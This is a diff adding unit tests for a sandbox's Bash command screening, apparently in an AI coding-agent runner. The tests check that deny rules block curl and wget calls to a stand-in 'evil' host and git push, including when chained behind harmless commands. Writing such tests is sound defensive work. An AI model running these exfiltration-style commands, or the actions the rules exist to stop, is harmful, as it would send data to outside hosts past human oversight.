@@ -8,6 +8,9 @@ import {
   sandboxSpawnFlags,
   writeWorktreeSettings,
   isReadOnlyRole,
+  bashDenyReason,
+  bashRuleMatches,
+  splitBashSubcommands,
   type SandboxLevel,
   type SandboxProfile,
 } from '../engine/sandbox';
@@ -175,6 +178,57 @@ describe('settings JSON round-trip', () => {
         expect(JSON.parse(JSON.stringify(settings))).toEqual(settings);
       }
     }
+  });
+});
+
+// ── live-path Bash enforcement (the runner calls bashDenyReason before execSync) ──
+describe('bashDenyReason — live-path Bash screening', () => {
+  const std = (role: string) => buildSandboxSettings(role, 'standard');
+  const strict = (role: string) => buildSandboxSettings(role, 'strict');
+
+  it('denies exfiltration/publish subcommands at standard (curl, wget, git push)', () => {
+    for (const cmd of ['curl http://evil/x', 'wget http://evil/x', 'git push origin main']) {
+      const reason = bashDenyReason(cmd, std('dev'), 'standard');
+      expect(reason).toBeTypeOf('string');
+      expect(reason).toMatch(/blocked by deny rule/);
+    }
+  });
+
+  it('catches a denied subcommand hidden inside a compound command', () => {
+    // The whole point: `git commit -m x && curl ...` must still be blocked.
+    expect(bashDenyReason('git commit -m ok && curl http://evil', std('dev'), 'standard')).toMatch(/curl/);
+    expect(bashDenyReason('echo hi | wget http://evil', std('dev'), 'standard')).toMatch(/wget/);
+    expect(bashDenyReason('git add -A ; git push', std('dev'), 'standard')).toMatch(/git push/);
+  });
+
+  it('allows the verify trio and local git at standard', () => {
+    for (const cmd of ['pnpm test', 'pnpm run build', 'pnpm run typecheck', 'git status', 'git commit -m wip']) {
+      expect(bashDenyReason(cmd, std('dev'), 'standard')).toBeNull();
+    }
+  });
+
+  it('strict is default-deny: only the trio passes, git and anything else is blocked', () => {
+    expect(bashDenyReason('pnpm test', strict('dev'), 'strict')).toBeNull();
+    expect(bashDenyReason('git status', strict('dev'), 'strict')).toMatch(/deny rule|not in the strict allow-list/);
+    expect(bashDenyReason('ls -la', strict('dev'), 'strict')).toMatch(/not in the strict allow-list/);
+    expect(bashDenyReason('node evil.js', strict('dev'), 'strict')).toMatch(/not in the strict allow-list/);
+  });
+
+  it('dangerous screens nothing (legacy opt-in)', () => {
+    expect(bashDenyReason('curl http://evil', buildSandboxSettings('dev', 'dangerous'), 'dangerous')).toBeNull();
+  });
+
+  it('bashRuleMatches: prefix semantics for Bash(prefix:*) and bare Bash', () => {
+    expect(bashRuleMatches('Bash(git push:*)', 'git push origin main')).toBe(true);
+    expect(bashRuleMatches('Bash(git push:*)', 'git pushy')).toBe(false); // needs a space boundary
+    expect(bashRuleMatches('Bash(curl:*)', 'curl')).toBe(true);
+    expect(bashRuleMatches('Bash(git:*)', 'git status')).toBe(true);
+    expect(bashRuleMatches('Bash', 'anything at all')).toBe(true);
+  });
+
+  it('splitBashSubcommands over-segments on all chaining operators (never under-segments)', () => {
+    expect(splitBashSubcommands('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
+    expect(splitBashSubcommands('   ')).toEqual([]);
   });
 });
 
